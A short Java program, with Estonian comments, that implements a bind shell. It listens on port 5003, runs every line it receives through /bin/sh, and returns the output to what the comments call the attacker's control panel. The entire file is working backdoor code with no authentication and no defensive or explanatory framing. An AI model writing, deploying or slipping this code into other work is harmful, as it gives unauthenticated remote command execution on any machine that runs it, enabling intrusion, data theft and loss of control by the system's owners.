import java.io.*;
import java.net.*;

public class Server {
    public static void main(String[] args) {
        int port = 5003;

        try {
            // Luuakse serveri võrgupesa, mis jääb porti 5003 ootama
            ServerSocket serverSocket = new ServerSocket(port);
            System.out.println("[*] Ootan ühendust pordil " + port + "...");

            // Võetakse ühendus kliendilt vastu
            Socket clientSocket = serverSocket.accept();
            System.out.println("[+] Ühendus loodud: " + clientSocket.getRemoteSocketAddress());

            // Voogude loomine andmete lugemiseks ja kirjutamiseks
            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);

            String command;
            // Loetakse ründaja saadetud käske rida-realalt
            while ((command = in.readLine()) != null) {
                if (command.equalsIgnoreCase("exit")) {
                    break;
                }

                // Käivitatakse käsk Linuxi terminalis (sh/bash kaudu)
                Process process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});

                // Loetakse käsu tulemus (väljund)
                BufferedReader processOutput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;

                while ((line = processOutput.readLine()) != null) {
                    response.append(line).append("\n");
                }

                // Kui vastus oli tühi, anname sellest märku
                if (response.length() == 0) {
                    response.append("Käsk täideti (vastus puudub).\n");
                }

                // Saadetakse tulemus tagasi kontrollpuldile (lisatakse lõpumärk END_OF_RESP)
                out.println(response.toString() + "---END_OF_RESP---");
            }

            // Sulgetakse kõik ühendused
            clientSocket.close();
            serverSocket.close();
            System.out.println("[*] Ühendus suletud.");

        } catch (IOException e) {
            System.out.println("Viga: " + e.getMessage());
        }
    }
}
